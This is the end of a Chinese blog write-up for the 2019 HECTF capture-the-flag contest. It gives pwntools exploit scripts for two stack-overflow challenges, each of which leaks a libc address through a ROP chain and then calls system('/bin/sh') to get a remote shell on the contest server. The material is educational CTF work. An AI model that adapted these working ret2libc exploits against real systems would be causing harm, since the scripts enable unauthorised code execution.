<h2 id="0x05-stackpwn"><a href="#0x05-stackpwn" class="headerlink" title="0x05 stackpwn"></a>0x05 stackpwn</h2><p>简单的栈溢出泄露libc版本，构造rop拿shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'stackpwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#p=process("stackpwn")</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10022</span>)</span><br><span class="line">pop_rdi=<span class="number">0x00400933</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_addr=<span class="number">0x040080D</span></span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x400954</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(libc_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"input your instructions...\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x06-easy-pwn"><a href="#0x06-easy-pwn" class="headerlink" title="0x06 easy_pwn"></a>0x06 easy_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10016</span>)</span><br><span class="line">elf=ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">libc_start=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">binaddr=<span class="number">0x006010A0</span></span><br><span class="line">main_addr=<span class="number">0x0004006F9</span></span><br><span class="line">pop_rdi=<span class="number">0x004007d3</span></span><br><span class="line">system_libc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Now play your game: "</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi) + p64(libc_got)+p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line">libc_base=libc-libc_start</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.recvuntil(<span class="string">"Leave your name: "</span>)</span><br><span class="line">p.send(<span class="string">"/bin/sh\x00\x00"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span> + p64(pop_rdi)+p64(binaddr)+p64(system_libc+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-11-08T12:56:01.306Z" itemprop="dateUpdated">2019-11-08 20:56:01</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/</a>
        
    </div>
    <footer>
        <a href="https://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/团队ctf竞赛/">团队ctf竞赛</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/&title=《2019HECTF wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/&title=《2019HECTF wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/ctf-writeup/ckzc1ac9n000g0suc2v2n4qii/2019picoCTF-5000分wp/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">2019picoCTF部分wp(5000分记录)</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/搭建/ckzc1acdj005c0sucrjxvffen/win10安装python2和python3兼容运行/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">win10安装python2和python3兼容运行</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">1.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Code-execution"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Code execution</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#我只会ping吗"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">我只会ping吗</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#file在哪里"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">file在哪里</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Romance签到"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Romance签到</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#金闪闪的小饼干"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">金闪闪的小饼干</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#缘分"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">缘分</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#你看这个php它又大又圆"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">你看这个php它又大又圆</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#让我们来一起变魔术吧"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">让我们来一起变魔术吧</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#问卷题目"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">问卷题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#哪吒？！"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">哪吒？！</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#这是一个极其简单的签到题"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">这是一个极其简单的签到题</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#印证血统的时候到了"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">印证血统的时候到了</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#咕咕咕果"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">咕咕咕果</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#RE"><span class="post-toc-number">3.</span> <span class="post-toc-text">RE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#qiandao"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">qiandao</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#helloRE"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">helloRE</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#鼠鼠"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">## 鼠鼠</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#math"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">math</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-number">4.</span> <span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#妈妈我想玩Base64"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">妈妈我想玩Base64</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SCP-log"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">SCP_log</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#啥玩意啊"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">啥玩意啊</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#书页要分栏"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">书页要分栏</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#蓝精灵"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">蓝精灵</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#so-easy"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">so_easy</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RC4"><span class="post-toc-number">4.7.</span> <span class="post-toc-text">RC4</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">5.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-窝窝头"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">0x01 窝窝头</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-stackpwn2"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">0x02 stackpwn2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-pwn-disco"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">0x03 pwn_disco</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-Hard-pwn"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">0x04 Hard_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-stackpwn"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">0x05 stackpwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-easy-pwn"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">0x06 easy_pwn</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        让这个世界的bug有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://w4nder.top/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.vigorous.top/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.mklkx.xyz/" target="_blank">mklkx</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.cnblogs.com/cx1ng/" target="_blank">cxing</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2018 - 2022
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/&title=《2019HECTF wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/ctf-writeup/ckzc1ac7z00020sucdri0hryg/2019HECTF-wp/&title=《2019HECTF wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACrElEQVR42u3aQXKEMAwEwPz/08kDUsCMbFMcmlOKsNi9B0sr6ecnvn5vr//P3N+5X+Xqzv1nly48PDy8V7aebOv+nfeM/M7D+/Hw8PCO8ZIl81M3f09+J98PHh4e3pd5s8w2CQYrXzceHh7e13h7n08SZTw8PLxv8mav3psu5287UmvBw8PD6+qoUUL8nb+P9Pfw8PDwlrvqeZBIDvT20N+wWzw8PLwDvPzAnTX+i00ssB/2iYeHh7eVNxtvmpUk2rU27AcPDw/vMC9p5LeLrT+ZhITL/+Lh4eEd4OUJcf7VJGEjx+TjBQ/9PTw8PLxNvHaLs2O9LW3UR3/eAMPDw8M7wGsT67ywu76fevQKDw8P7xgvOYJnYaMtvLYB42HneHh4eAd4K7lovswsMORhpt0hHh4e3jpvb2mgLWHMgkECxsPDwzvHS5Lp5BXrd1aGvfDw8PDe5M2O8jxgzMq+OWNp6AoPDw9vmZeXX2fbbdtabdNrGPHw8PDwynnOtgSQF1LbIdRZafjyzXh4eHjHeLMCax4wZk/OBhHw8PDwTvPyZvwsXW5DRVsiifaMh4eHt5WXpNQrQ1S7hq7yhB4PDw/vTV5bZs0LwTmmHed62BseHh7eAV57HLcJcT6wdWJdPDw8vDd5swJu0ZoalYyHyToeHh7eK7z75fPFkjckiXU+dHX5uwEPDw/vAK9NcPNAMvuyZlfU38PDw8Nb4P2WVxsAZmlx3ei6SuXx8PDwDvDaA3dXSJglx0XTaxZP8PDw8GLebJlkgbYY0T4Z/TDAw8PDO8bLh5zaoajZeMFSfQUPDw/v87y8ZZWUG3Z9fXh4eHjf4Q1T26Aw0a4bBRU8PDy8Y7xZyaAtVcxGrPLAcDkZgYeHh7eV1/7gX2lZ5eMI91s/0t/Dw8PDe/7sH6oNfYKtElJtAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '等你回来呀~';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)欢迎回来!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
